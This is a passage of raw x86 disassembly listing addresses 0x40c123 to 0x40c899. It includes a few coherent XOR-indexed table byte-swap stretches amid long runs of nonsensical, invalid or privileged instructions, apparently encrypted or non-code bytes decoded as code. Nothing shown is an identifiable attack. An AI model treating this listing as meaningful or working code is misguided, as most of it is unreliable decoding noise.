  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    ax,WORD PTR ds:[ebx+0x2e10b189]
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c0de
  40c150:	ror    DWORD PTR [edi+0x351607a0],1
  40c156:	and    DWORD PTR [eax-0x4b308d71],ebp
  40c15c:	sbb    eax,ebx
  40c15e:	test   eax,0x688cdbf4
  40c163:	ret    0xf22a
  40c166:	les    ebp,FWORD PTR [ebx-0x16]
  40c169:	outs   dx,DWORD PTR ds:[esi]
  40c16a:	out    0xe9,al
  40c16c:	mov    ds:0x2d1e6966,al
  40c171:	sti    
  40c172:	or     al,BYTE PTR [esi+0x52]
  40c175:	or     cl,BYTE PTR es:[ebx+0xce48d3f]
  40c17c:	adc    bl,dl
  40c17e:	int    0x2
  40c180:	icebp  
  40c181:	sub    DWORD PTR [ecx+0x5c],esp
  40c184:	cdq    
  40c185:	dec    ecx
  40c186:	sub    BYTE PTR [edx-0x3af922e7],0xd3
  40c18d:	stos   BYTE PTR es:[edi],al
  40c18e:	fwait
  40c18f:	popf   
  40c190:	(bad)  
  40c191:	enter  0xef5a,0xd3
  40c195:	ins    BYTE PTR es:[edi],dx
  40c196:	cmp    al,0xc4
  40c198:	shr    esp,cl
  40c19a:	imul   ebp,DWORD PTR [edi-0x6ec64a3c],0xeaf236c6
  40c1a4:	xchg   esi,eax
  40c1a5:	outs   dx,DWORD PTR ds:[esi]
  40c1a6:	mov    bl,0x8b
  40c1a8:	ss ins DWORD PTR es:[edi],dx
  40c1aa:	clc    
  40c1ab:	enter  0xb39b,0xd9
  40c1af:	ss pop ds
  40c1b1:	popa   
  40c1b2:	fadd   st,st(3)
  40c1b4:	ret    0xfecf
  40c1b7:	test   al,0x84
  40c1b9:	pushf  
  40c1ba:	dec    ebx
  40c1bb:	dec    eax
  40c1bc:	frstor [edi]
  40c1be:	or     al,0xc
  40c1c0:	adc    al,BYTE PTR [ebx]
  40c1c2:	ins    BYTE PTR es:[edi],dx
  40c1c3:	push   es
  40c1c4:	test   al,0x24
  40c1c6:	mov    edi,esi
  40c1c8:	pop    es
  40c1c9:	pop    ecx
  40c1ca:	dec    ebx
  40c1cb:	shl    DWORD PTR [ebx+0x57],0x2c
  40c1cf:	mov    esp,0x1da476a4
  40c1d4:	sbb    DWORD PTR [ebp+0x7b598a50],esp
  40c1da:	pop    es
  40c1db:	xor    bl,bl
  40c1dd:	pop    es
  40c1de:	mov    bh,0xd7
  40c1e0:	call   0x2e0d:0xe8b7a5d4
  40c1e7:	sub    dl,BYTE PTR [esi-0x61619d2c]
  40c1ed:	call   0x49b262c5
  40c1f2:	dec    edx
  40c1f3:	inc    ebx
  40c1f4:	inc    esp
  40c1f5:	pop    edi
  40c1f6:	xlat   BYTE PTR ds:[ebx]
  40c1f7:	ror    BYTE PTR [ecx],0x1e
  40c1fa:	cmp    BYTE PTR [esp+edi*2-0x2b],dh
  40c1fe:	addr16 push ebx
  40c200:	adc    dh,ch
  40c202:	or     eax,0x827c1f6e
  40c207:	arpl   WORD PTR [ebx],dx
  40c209:	pop    edi
  40c20a:	fisubr WORD PTR es:[esi-0x31fd3859]
  40c211:	(bad)  
  40c212:	(bad)  [eax+edi*1]
  40c215:	cmp    BYTE PTR [edx-0x788349a7],0xe4
  40c21c:	jbe    0x40c256
  40c21e:	outs   dx,BYTE PTR ds:[esi]
  40c21f:	mov    ebp,0x3048a7a2
  40c224:	cmp    edi,DWORD PTR [eax]
  40c226:	lahf   
  40c227:	inc    eax
  40c228:	adc    esp,DWORD PTR [ebp-0x3192b3fc]
  40c22e:	adc    eax,0x6b6c0f19
  40c233:	mov    esi,0x7eada4da
  40c238:	inc    BYTE PTR [edx-0x15]
  40c23b:	jl     0x40c259
  40c23d:	ret    
  40c23e:	fcom   st(0)
  40c240:	(bad)  
  40c241:	cmp    al,0xd
  40c243:	sbb    ch,BYTE PTR [ebx]
  40c245:	mov    ebp,0xa6ac3e19
  40c24a:	aaa    
  40c24b:	out    dx,al
  40c24c:	push   esi
  40c24d:	fsubr  st,st(1)
  40c24f:	das    
  40c250:	lea    edi,[ebx]
  40c252:	sbb    al,0xce
  40c254:	aad    0x61
  40c256:	adc    bl,BYTE PTR [ecx+0xb]
  40c259:	mov    dh,0xf9
  40c25b:	pop    esp
  40c25c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c25d:	shl    BYTE PTR [ebx-0x5a00ed8c],1
  40c263:	sbb    eax,0xffffffe8
  40c266:	sti    
  40c267:	jo     0x40c2b8
  40c269:	pop    ebx
  40c26a:	jmp    0xb5d9:0x2f5f9cac
  40c271:	jbe    0x40c2bc
  40c273:	mov    ch,0x29
  40c275:	pop    ds
  40c276:	inc    eax
  40c277:	aaa    
  40c278:	sbb    eax,DWORD PTR [edx+0x1498b465]
  40c27e:	mov    bl,al
  40c280:	call   0xe84d:0xe758c267
  40c287:	sbb    cl,ch
  40c289:	(bad)  
  40c28a:	enter  0x16cb,0x10
  40c28e:	jae    0x40c2f6
  40c290:	idiv   DWORD PTR [esi-0x23]
  40c293:	int3   
  40c294:	aad    0x9a
  40c296:	mov    edi,DWORD PTR [ecx-0x55]
  40c299:	adc    DWORD PTR [edx+ecx*8-0x68641457],edx
  40c2a0:	retf   0xf370
  40c2a3:	push   ebp
  40c2a4:	out    dx,eax
  40c2a5:	out    0x2b,eax
  40c2a7:	mov    eax,0x96ddefac
  40c2ac:	xchg   esi,eax
  40c2ad:	cmp    BYTE PTR [ebp-0x51ccff8e],0x3f
  40c2b4:	stos   DWORD PTR es:[edi],eax
  40c2b5:	mov    ch,0xb2
  40c2b7:	(bad)
  40c2ba:	fldenv fs:[eax+0x16]
  40c2be:	mov    ecx,0x6fbe2b92
  40c2c3:	mov    eax,ds:0x2ae40c89
  40c2c8:	inc    esp
  40c2c9:	sar    DWORD PTR [eax+0x24],cl
  40c2cc:	mov    esp,0x67933b57
  40c2d1:	add    eax,0xada74b91
  40c2d6:	pop    es
  40c2d7:	add    ch,al
  40c2d9:	std    
  40c2da:	pop    esi
  40c2db:	add    al,0x70
  40c2dd:	add    al,0xa0
  40c2df:	cld    
  40c2e0:	stos   BYTE PTR es:[edi],al
  40c2e1:	or     al,0x1f
  40c2e3:	ret    0xf23a
  40c2e6:	ins    BYTE PTR es:[edi],dx
  40c2e7:	outs   dx,BYTE PTR ds:[esi]
  40c2e8:	xlat   BYTE PTR ds:[ebx]
  40c2e9:	sbb    ecx,ebx
  40c2eb:	inc    esp
  40c2ec:	mov    esp,0x47db1491
  40c2f1:	inc    ebp
  40c2f2:	loope  0x40c274
  40c2f4:	mov    bh,0xe2
  40c2f6:	and    eax,0xaa3d583
  40c2fb:	repz mov ch,0x9b
  40c2fe:	rcl    ebx,0xd2
  40c301:	mov    WORD PTR [edi-0x4e],cs
  40c304:	xchg   esi,eax
  40c305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c306:	pop    esp
  40c307:	cmp    BYTE PTR [ecx-0x3528b02c],0x48
  40c30e:	outs   dx,DWORD PTR ds:[esi]
  40c30f:	xchg   edi,eax
  40c311:	xchg   esp,eax
  40c312:	xchg   esi,eax
  40c313:	inc    esi
  40c314:	mov    eax,ds:0x66879d56
  40c319:	dec    eax
  40c31a:	mov    ch,0xd
  40c31c:	and    BYTE PTR [ecx-0x550453b4],al
  40c322:	call   esi
  40c324:	lock sbb eax,0x569ad80b
  40c32a:	rcl    DWORD PTR [edi],1
  40c32c:	les    edi,FWORD PTR [esi-0x5c092086]
  40c332:	xor    al,0x31
  40c334:	adc    al,0x7c
  40c336:	push   0x6d53136a
  40c33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c33c:	or     al,0x9b
  40c33e:	mov    ebx,0x1c0051b6
  40c343:	idiv   dh
  40c345:	or     ebp,DWORD PTR [edx-0x6b]
  40c348:	shl    DWORD PTR [edi-0x6e],0xec
  40c34c:	mov    DWORD PTR [esi-0x43],eax
  40c34f:	push   ss
  40c350:	mov    bl,0x8e
  40c352:	adc    esi,DWORD PTR [esi+0x5f023407]
  40c358:	jb     0x40c3d5
  40c35a:	sbb    eax,0x52fa3d6b
  40c35f:	aaa    
  40c360:	dec    esi
  40c361:	push   0x480b92c4
  40c366:	retf   0xef57
  40c369:	mov    al,0xa7
  40c36b:	loopne 0x40c3cf
  40c36d:	push   edi
  40c36e:	inc    ebp
  40c36f:	adc    al,0xe0
  40c371:	loopne 0x40c3b9
  40c373:	jmp    0x8f3f:0xd0ea472
  40c37a:	clc    
  40c37b:	xchg   esp,eax
  40c37c:	retf   
  40c37d:	lods   eax,DWORD PTR ds:[esi]
  40c37e:	arpl   WORD PTR [edi-0x6ac5c9f8],bp
  40c384:	add    al,0x2e
  40c386:	ror    DWORD PTR [ebp-0x15],0xd8
  40c38a:	pop    esi
  40c38b:	xchg   ebp,eax
  40c38c:	fcmovb st,st(4)
  40c38e:	mov    esp,0x207f2e87
  40c393:	cmp    bl,al
  40c395:	inc    esi
  40c396:	scas   eax,DWORD PTR es:[edi]
  40c397:	and    DWORD PTR [edx+0x52464c84],0x98f52315
  40c3a1:	xchg   edx,eax
  40c3a2:	call   0xf73b:0x5b561f24
  40c3a9:	xchg   edi,eax
  40c3aa:	and    edi,ebp
  40c3ac:	pop    esi
  40c3ad:	add    eax,0xc04b582e
  40c3b2:	outs   dx,BYTE PTR ds:[esi]
  40c3b3:	call   0x5dab88dc
  40c3b8:	pmulhuw mm7,QWORD PTR [esi+0x1ef6fa1d]
  40c3bf:	push   ecx
  40c3c0:	mov    dl,0x62
  40c3c2:	add    edx,DWORD PTR [edi+0x4bd8d8f4]
  40c3c8:	jmp    0xe75e188e
  40c3cd:	push   0x853857fc
  40c3d2:	aad    0xf0
  40c3d4:	push   cs
  40c3d5:	xor    al,0x78
  40c3d7:	stos   DWORD PTR es:[edi],eax
  40c3d8:	mov    bl,0x41
  40c3da:	jbe    0x40c451
  40c3dc:	jns    0x40c3de
  40c3de:	(bad)  
  40c3e0:	jb     0x40c402
  40c3e2:	and    ebp,DWORD PTR [eax]
  40c3e4:	call   DWORD PTR [ebx]
  40c3e6:	sbb    DWORD PTR [eax+edi*2+0x7f7277cf],edi
  40c3ed:	push   es
  40c3ee:	push   esp
  40c3ef:	fiadd  DWORD PTR [ecx-0x74]
  40c3f2:	mov    ds:0xd5b44911,eax
  40c3f7:	je     0x40c474
  40c3f9:	lea    edx,[esi-0x1ebf8312]
  40c3ff:	pusha  
  40c400:	xor    dh,BYTE PTR [eax-0x6efffa5f]
  40c406:	mov    edx,DWORD PTR [ebx-0x51]
  40c409:	and    BYTE PTR [ebx-0x2a1c5cc2],dl
  40c40f:	sub    ecx,DWORD PTR [ebx+eax*1-0x5b]
  40c413:	cmp    BYTE PTR [edx-0x1e],0x18
  40c417:	ss dec edi
  40c419:	lea    edx,[edx-0x3d88d600]
  40c41f:	or     DWORD PTR [edi-0x34],0x1e
  40c423:	dec    ebx
  40c424:	in     eax,dx
  40c425:	push   ss
  40c426:	iret   
  40c427:	and    eax,0xdd6abcf2
  40c42c:	inc    esi
  40c42d:	jns    0x40c450
  40c42f:	cs call 0xdc2de860
  40c435:	and    eax,0xcb38bfc9
  40c43a:	or     dh,bh
  40c43c:	mov    al,ds:0x596d6d23
  40c441:	stos   BYTE PTR es:[edi],al
  40c442:	shl    DWORD PTR [eax],0x67
  40c445:	xchg   ecx,eax
  40c446:	or     cl,BYTE PTR es:[eax-0x4e]
  40c44a:	xchg   BYTE PTR [ecx-0x29],dl
  40c44d:	call   0x494f:0x38581b1c
  40c454:	adc    al,0x93
  40c456:	jge    0x40c4b9
  40c458:	cdq    
  40c459:	retf   0x876a
  40c45c:	xchg   ecx,eax
  40c45d:	adc    al,0x8d
  40c45f:	pop    esp
  40c460:	inc    esp
  40c461:	mov    bh,0x2e
  40c463:	mov    WORD PTR [ebx-0x2a],ss
  40c466:	pop    esp
  40c467:	(bad)  
  40c468:	in     al,0x7
  40c46a:	not    bh
  40c46c:	adc    ecx,DWORD PTR [edx]
  40c46e:	add    eax,0x7038f7c8
  40c473:	inc    edx
  40c474:	push   ds
  40c475:	xor    bh,BYTE PTR [ebx-0x2d17d5fd]
  40c47b:	cmc    
  40c47c:	inc    edi
  40c47d:	dec    edx
  40c47e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c47f:	out    0xcc,al
  40c481:	push   ebp
  40c482:	mov    al,ds:0x51cebe33
  40c487:	xchg   esp,eax
  40c488:	mov    ch,bh
  40c48a:	and    eax,0xc483570e
  40c48f:	jb     0x40c4cf
  40c491:	or     ecx,DWORD PTR [esi]
  40c493:	adc    eax,0xb2beef3d
  40c498:	pop    ds
  40c499:	(bad)  
  40c49a:	popa   
  40c49b:	jp     0x40c473
  40c49d:	popa   
  40c49e:	push   esp
  40c49f:	or     cl,BYTE PTR [ecx]
  40c4a1:	repz push edi
  40c4a3:	xchg   dl,cl
  40c4a5:	and    cl,bh
  40c4a7:	das    
  40c4a8:	adc    BYTE PTR [esi+0x70],bh
  40c4ab:	jbe    0x40c438
  40c4ad:	sahf   
  40c4ae:	or     al,0xb6
  40c4b0:	daa    
  40c4b1:	or     DWORD PTR [eax],0x4a
  40c4b4:	(bad)  
  40c4b5:	mov    edi,0x2b3c7a5
  40c4ba:	cmp    DWORD PTR [edx+0x6c],ebp
  40c4bd:	mov    al,ds:0xb4e4ca25
  40c4c2:	inc    edi
  40c4c3:	mov    ch,0x8c
  40c4c5:	inc    ebp
  40c4c6:	mov    WORD PTR [eax-0x6ea6bbd],ds
  40c4cc:	mov    dh,al
  40c4ce:	psllw  mm6,QWORD PTR [edx-0x14]
  40c4d2:	add    ah,bh
  40c4d4:	popa   
  40c4d5:	push   0x66caffda
  40c4da:	retf   
  40c4db:	rol    dl,cl
  40c4dd:	(bad)  ds:0xe936d007
  40c4e3:	dec    edx
  40c4e4:	or     eax,DWORD PTR [ebx]
  40c4e6:	pop    ebp
  40c4e7:	into   
  40c4e8:	lock fs stos BYTE PTR es:[edi],al
  40c4eb:	dec    esp
  40c4ec:	test   eax,0x33d8adb4
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	add    BYTE PTR [eax-0x38],ch
  40c543:	dec    bp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c507
  40c54d:	in     eax,0x99
  40c54f:	in     al,0x3b
  40c551:	imul   ebp,DWORD PTR [ebx-0x60442ad],0x3d
  40c558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c559:	xchg   esp,eax
  40c55a:	(bad)  
  40c55c:	jo     0x40c55f
  40c55e:	rol    edx,0x8a
  40c561:	retf   
  40c562:	sbb    ch,BYTE PTR gs:[edx]
  40c565:	sbb    DWORD PTR [edx],eax
  40c567:	test   esp,edi
  40c569:	repnz dec ecx
  40c56b:	push   edi
  40c56d:	cld    
  40c56e:	and    al,ah
  40c570:	xchg   esi,eax
  40c571:	ror    DWORD PTR [eax-0x2874bf1e],cl
  40c577:	mov    ah,0xee
  40c579:	in     al,dx
  40c57a:	popf   
  40c57b:	out    0x15,eax
  40c57d:	mov    gs,WORD PTR [edx+0x7d]
  40c580:	cmp    BYTE PTR [edx+ebp*1-0x6c5a9eab],al
  40c587:	push   edx
  40c588:	xchg   ecx,eax
  40c589:	cmp    ebx,DWORD PTR [esi-0x34]
  40c58c:	ret    0xe76e
  40c58f:	fwait
  40c590:	outs   dx,DWORD PTR ds:[esi]
  40c591:	in     al,0x1b
  40c593:	adc    DWORD PTR [esi-0x5c4283d8],eax
  40c599:	aaa    
  40c59a:	push   0xf4a32b97
  40c59f:	ror    esp,1
  40c5a1:	pop    ebp
  40c5a2:	xchg   esp,eax
  40c5a3:	in     al,0xba
  40c5a5:	push   eax
  40c5a6:	fwait
  40c5a7:	cmp    BYTE PTR [esi],0xbf
  40c5aa:	xor    bh,bh
  40c5ac:	ins    DWORD PTR es:[edi],dx
  40c5ad:	scas   al,BYTE PTR es:[edi]
  40c5ae:	clc    
  40c5af:	mov    WORD PTR [edx-0x61],gs
  40c5b2:	out    0x40,eax
  40c5b4:	repnz inc ebp
  40c5b6:	out    0xe7,eax
  40c5b8:	dec    eax
  40c5b9:	sbb    eax,0x91237b4d
  40c5be:	fadd   DWORD PTR [edx]
  40c5c0:	fiadd  DWORD PTR [ebx]
  40c5c2:	aam    0x30
  40c5c4:	and    ecx,DWORD PTR [ebx-0x44be310b]
  40c5ca:	idiv   DWORD PTR [eax+0x5b]
  40c5cd:	mov    WORD PTR [ebx],?
  40c5cf:	popa   
  40c5d0:	loopne 0x40c5c9
  40c5d2:	hlt    
  40c5d3:	dec    esi
  40c5d4:	(bad)  
  40c5d5:	cmp    al,0x52
  40c5d7:	cmc    
  40c5d8:	mov    ch,bl
  40c5da:	int    0x5b
  40c5dc:	or     DWORD PTR [edi+ebx*2-0x14309490],esp
  40c5e3:	push   ss
  40c5e4:	shl    esp,cl
  40c5e6:	mov    DWORD PTR [ebp-0x137ac21c],esp
  40c5ec:	mov    al,0xdd
  40c5ee:	shl    DWORD PTR [ecx],0xd2
  40c5f1:	das    
  40c5f2:	out    0x9e,eax
  40c5f4:	jg     0x40c5e0
  40c5f6:	jae    0x40c59f
  40c5f8:	xchg   DWORD PTR [esi],ebx
  40c5fa:	xchg   ecx,eax
  40c5fb:	xchg   ecx,eax
  40c5fc:	shl    BYTE PTR [esi-0x3d],cl
  40c5ff:	xchg   edi,eax
  40c600:	shl    BYTE PTR [esi+0x75cce732],1
  40c606:	in     eax,dx
  40c607:	mov    ch,0xfb
  40c609:	pop    ebp
  40c60a:	dec    ebx
  40c60b:	inc    eax
  40c60c:	fild   QWORD PTR [ebx]
  40c60e:	pop    edi
  40c60f:	ins    DWORD PTR es:[edi],dx
  40c610:	in     eax,0xa7
  40c612:	(bad)  
  40c613:	push   ecx
  40c614:	adc    al,0xb3
  40c616:	aam    0x31
  40c618:	or     BYTE PTR [esi+0x6b],bl
  40c61b:	lea    ecx,ds:0xade55354
  40c621:	adc    ah,cl
  40c623:	out    dx,al
  40c624:	jns    0x40c637
  40c626:	push   0xa5d436d7
  40c62b:	retf   
  40c62c:	push   cs
  40c62d:	xor    al,BYTE PTR [ebp+0x37]
  40c630:	ret    0xac7a
  40c633:	(bad)  
  40c634:	or     eax,0x87e7f440
  40c639:	rol    bh,cl
  40c63b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63c:	xor    BYTE PTR [ecx-0x6c],dl
  40c63f:	je     0x40c63e
  40c641:	imul   eax
  40c643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c644:	push   ds
  40c645:	sub    eax,0x3746cfb2
  40c64a:	hlt    
  40c64b:	mov    esp,edi
  40c64d:	push   esp
  40c64e:	and    al,0x29
  40c650:	pop    esi
  40c651:	imul   eax,DWORD PTR [ecx],0xf
  40c654:	xchg   ebp,eax
  40c655:	es jle 0x40c617
  40c658:	lahf   
  40c659:	enter  0x9f8a,0xeb
  40c65d:	push   es
  40c65e:	setge  BYTE PTR [edi]
  40c661:	push   esi
  40c662:	sub    DWORD PTR [eax],ecx
  40c664:	imul   ecx,DWORD PTR [esi+0x2b],0xffffff82
  40c668:	add    eax,0x2038d8
  40c66d:	aaa    
  40c66e:	cmp    ecx,edx
  40c670:	sub    eax,0x46aaf79b
  40c675:	adc    edx,DWORD PTR [eax]
  40c677:	inc    edx
  40c678:	lods   eax,DWORD PTR ds:[esi]
  40c679:	aad    0x31
  40c67b:	ja     0x40c6c3
  40c67d:	ja     0x40c6df
  40c67f:	adc    DWORD PTR [esi-0x4cac1662],eax
  40c685:	sub    al,0xc6
  40c687:	adc    al,0x94
  40c689:	cwde   
  40c68a:	mov    esp,0xbe55aec1
  40c68f:	and    DWORD PTR [ecx],eax
  40c691:	push   ecx
  40c692:	mov    ds:0x4cd03fb3,eax
  40c697:	and    DWORD PTR [eax-0x3cc9723c],edi
  40c69d:	inc    ecx
  40c69e:	add    bh,al
  40c6a0:	adc    BYTE PTR [edx+0x24822700],dl
  40c6a6:	xlat   BYTE PTR ds:[ebx]
  40c6a7:	adc    dh,BYTE PTR [ebx]
  40c6a9:	test   eax,0x5bd4dca
  40c6ae:	inc    esp
  40c6af:	inc    esp
  40c6b0:	sub    DWORD PTR [ecx+0x2d],ecx
  40c6b3:	int    0x63
  40c6b5:	fs fwait
  40c6b7:	mov    eax,0x5b6a33b2
  40c6bc:	scas   eax,DWORD PTR es:[edi]
  40c6bd:	shl    DWORD PTR [eax+0x33f13ae0],0x8c
  40c6c4:	(bad)  
  40c6c6:	jbe    0x40c68f
  40c6c8:	stc    
  40c6c9:	arpl   WORD PTR [esi+0x75],di
  40c6cc:	leave  
  40c6cd:	in     eax,0x81
  40c6cf:	mov    esp,0x6d7751a7
  40c6d4:	or     al,0x22
  40c6d6:	(bad)  
  40c6d7:	mov    al,ds:0x38918b05
  40c6dc:	lods   eax,DWORD PTR ds:[esi]
  40c6dd:	dec    edi
  40c6de:	jle    0x40c71b
  40c6e0:	or     al,0x6a
  40c6e2:	in     eax,dx
  40c6e3:	add    BYTE PTR [edi+eax*2],cl
  40c6e6:	clc    
  40c6e7:	ds out dx,eax
  40c6e9:	je     0x40c764
  40c6eb:	mov    eax,0x97094475
  40c6f0:	add    al,0x57
  40c6f2:	pop    ss
  40c6f3:	push   ebp
  40c6f4:	imul   ebx,DWORD PTR [ebx+0x56],0x5c2adefa
  40c6fb:	mov    dl,0x59
  40c6fd:	daa    
  40c6fe:	mov    cl,0x3c
  40c700:	adc    al,0x84
  40c702:	out    0xec,eax
  40c704:	cmp    DWORD PTR [esi],ebp
  40c706:	inc    ebp
  40c707:	iret   
  40c708:	pop    es
  40c709:	(bad)  
  40c70a:	fiadd  DWORD PTR [esi-0x65b0aa0a]
  40c710:	sbb    eax,0x59996412
  40c715:	sbb    eax,0xfb5a987a
  40c71a:	call   0x550c5fd5
  40c71f:	rcl    DWORD PTR [esi-0x61],cl
  40c722:	sub    eax,0x46236ae5
  40c727:	outs   dx,DWORD PTR ds:[esi]
  40c728:	jae    0x40c773
  40c72a:	rcl    esp,1
  40c72c:	mov    gs,WORD PTR [ecx]
  40c72e:	jb     0x40c73b
  40c730:	(bad)  
  40c731:	xchg   edi,eax
  40c732:	xlat   BYTE PTR ds:[ebx]
  40c733:	(bad)
  40c736:	cs das 
  40c738:	push   0x5a
  40c73a:	stc    
  40c73b:	xchg   DWORD PTR [ecx],ebx
  40c73d:	adc    esp,ebp
  40c73f:	sub    DWORD PTR [edi+0x55],ebx
  40c742:	frstor [edi]
  40c744:	int    0xd6
  40c746:	xchg   ebp,eax
  40c747:	lahf   
  40c748:	stos   DWORD PTR es:[edi],eax
  40c749:	pop    edi
  40c74a:	mov    bh,0xc5
  40c74c:	pop    edx
  40c74d:	sbb    eax,0x28f9cefc
  40c752:	adc    DWORD PTR [edi-0x6c6a60aa],eax
  40c758:	popf   
  40c759:	imul   esp,DWORD PTR [edi+0x10640d8e],0xf939edff
  40c763:	xchg   edx,eax
  40c764:	(bad)  
  40c765:	xor    BYTE PTR [esi],0x7a
  40c768:	mov    edi,0x1c6aa9bb
  40c76d:	mov    al,ds:0x82a45b50
  40c772:	ror    DWORD PTR [eax],1
  40c774:	call   FWORD PTR [edx-0x5c]
  40c777:	ret    
  40c778:	outs   dx,BYTE PTR ds:[esi]
  40c779:	clc    
  40c77a:	cwde   
  40c77b:	inc    ecx
  40c77c:	jne    0x40c71d
  40c77e:	dec    ebp
  40c77f:	je     0x40c7bf
  40c781:	cmp    eax,0xb4b691c5
  40c786:	leave  
  40c787:	xlat   BYTE PTR ds:[ebx]
  40c788:	ins    BYTE PTR es:[edi],dx
  40c789:	sub    al,0xdc
  40c78b:	inc    ecx
  40c78c:	test   DWORD PTR [edi+0x342e4230],esi
  40c792:	push   ss
  40c793:	dec    ecx
  40c794:	cmp    cl,dl
  40c796:	mov    ah,0x2c
  40c798:	adc    ah,BYTE PTR [ecx-0x2b]
  40c79b:	jne    0x40c7c5
  40c79d:	jo     0x40c733
  40c79f:	scas   al,BYTE PTR es:[edi]
  40c7a0:	adc    DWORD PTR [eax+0x3e9ec82f],eax
  40c7a6:	xor    ebp,esp
  40c7a8:	repnz xlat BYTE PTR ds:[ebx]
  40c7aa:	(bad)  
  40c7ab:	ror    DWORD PTR [ebp-0x42c9514b],1
  40c7b1:	adc    BYTE PTR [eax],ah
  40c7b3:	rcl    eax,1
  40c7b5:	out    0x96,al
  40c7b7:	and    BYTE PTR ds:0xfa43a965,al
  40c7bd:	sar    BYTE PTR [ecx+0x37],0x1
  40c7c1:	adc    DWORD PTR ds:0xb5f3ba9a,0x516175d5
  40c7cb:	aaa    
  40c7cc:	add    DWORD PTR [edx-0x78],ebp
  40c7cf:	and    al,0x39
  40c7d1:	nop
  40c7d2:	or     DWORD PTR [ecx+0x7cc03c7f],ecx
  40c7d8:	lods   eax,DWORD PTR ds:[esi]
  40c7d9:	nop
  40c7da:	mov    cl,0xe5
  40c7dc:	push   edi
  40c7dd:	ins    DWORD PTR es:[edi],dx
  40c7de:	jbe    0x40c7d7
  40c7e0:	and    esi,DWORD PTR [esi]
  40c7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7e3:	push   edx
  40c7e4:	jl     0x40c7ca
  40c7e6:	mov    ecx,0x9ce54d3c
  40c7eb:	and    eax,0x72d1cc90
  40c7f0:	dec    esi
  40c7f1:	sbb    ecx,DWORD PTR [eax]
  40c7f3:	or     al,0xd0
  40c7f5:	daa    
  40c7f6:	fs out dx,al
  40c7f8:	pop    edx
  40c7f9:	outs   dx,DWORD PTR ds:[esi]
  40c7fa:	out    dx,al
  40c7fb:	and    esi,DWORD PTR [edx+0x61d0bddc]
  40c801:	mov    esi,DWORD PTR [edi+0xb018707]
  40c807:	aaa    
  40c808:	dec    eax
  40c809:	loop   0x40c79c
  40c80b:	enter  0x9953,0xa3
  40c80f:	add    al,0xa5
  40c811:	mov    BYTE PTR [esi+0x4990446b],al
  40c817:	mov    eax,0xc39dc5d4
  40c81c:	xor    eax,0x6bd3cc1a
  40c821:	sar    DWORD PTR [ecx],0x35
  40c824:	xor    edx,ebp
  40c826:	(bad)  
  40c827:	pop    ds
  40c828:	mov    edi,0x9d62537e
  40c82d:	clc    
  40c82e:	mov    edi,0x1e47d7fe
  40c833:	inc    ebp
  40c834:	(bad)  
  40c835:	daa    
  40c836:	cwde   
  40c837:	je     0x40c837
  40c839:	cld    
  40c83a:	add    BYTE PTR ds:0x1c4254f0,dh
  40c840:	push   DWORD PTR [ebx+0x11]
  40c843:	xchg   ecx,eax
  40c844:	xlat   BYTE PTR ds:[ebx]
  40c845:	mov    al,ds:0x4afe65d3
  40c84a:	(bad)  
  40c84b:	stos   DWORD PTR es:[edi],eax
  40c84c:	lods   eax,DWORD PTR ds:[esi]
  40c84d:	jae    0x40c86c
  40c84f:	je     0x40c86c
  40c851:	cwde   
  40c852:	pop    esi
  40c853:	xchg   edx,eax
  40c854:	mov    ch,0x3f
  40c856:	add    esi,0x52
  40c859:	int    0x52
  40c85b:	out    dx,al
  40c85c:	icebp  
  40c85d:	les    ebx,FWORD PTR [ebx-0x63]
  40c860:	sbb    al,0x63
  40c862:	lea    ecx,[edi]
  40c864:	fwait
  40c865:	sbb    ebx,DWORD PTR [eax*4+0x4eb10fb9]
  40c86c:	addr16 mov eax,edx
  40c86f:	mov    dh,0xac
  40c871:	aaa    
  40c872:	fdiv   DWORD PTR [esp+eiz*4]
  40c875:	imul   ebx,esi,0x36cfe540
  40c87b:	jmp    0x63ed:0xd97343f9
  40c882:	retf   0xd81c
  40c885:	mov    ch,0x9d
  40c887:	mov    ebp,0x68628b8b
  40c88c:	or     bh,BYTE PTR [ecx]
  40c88e:	iret   
  40c88f:	inc    ebp
  40c890:	sub    DWORD PTR [ecx+edx*2],0x9e505ed6
  40c897:	xlat   BYTE PTR ds:[ebx]
  40c898:	pop    ss
  40c899:	dec    esp
